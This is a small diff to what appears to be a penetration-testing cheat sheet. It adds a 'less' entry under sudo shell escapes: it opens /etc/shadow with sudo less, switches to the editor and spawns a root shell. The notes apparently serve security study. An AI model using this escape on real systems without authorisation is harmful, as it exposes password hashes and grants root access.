@@ -110,6 +110,12 @@ sudo vi
 ```
 And you have shell.
 
+**less**
+```
+sudo less /etc/shadow
+v
+:shell
+```
 
 
 ### Software vulnerabilites
